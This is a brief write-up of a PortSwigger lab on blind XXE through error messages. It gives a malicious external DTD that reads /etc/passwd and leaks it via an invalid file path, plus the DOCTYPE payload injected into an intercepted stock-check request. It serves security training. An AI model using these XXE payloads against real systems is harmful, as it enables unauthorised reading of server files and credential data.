![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/de4c9541-4a76-4c71-9bc4-f57b46a12ed2)

### Solution

we will store and view the payload

```js
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

When imported, this page will read the contents of /etc/passwd into the file entity, and then try to use that entity in a file path.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/c625146a-fd87-4228-b3d6-fdbb1bc8a14f)

Click "View exploit" and take a note of the URL for your malicious DTD.

URL - `https://exploit-0afe0072035c879b8109deb2019d00c6.exploit-server.net/exploit`

You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/eee79d73-642a-4fd5-80c6-3aa4112bad67)

we will insert this payload

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/dfdeb87c-98bf-4c58-8c83-45bdedbfab84)

lab solved

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/1f519d4e-6c90-4c5e-939e-d762602d0e1f)
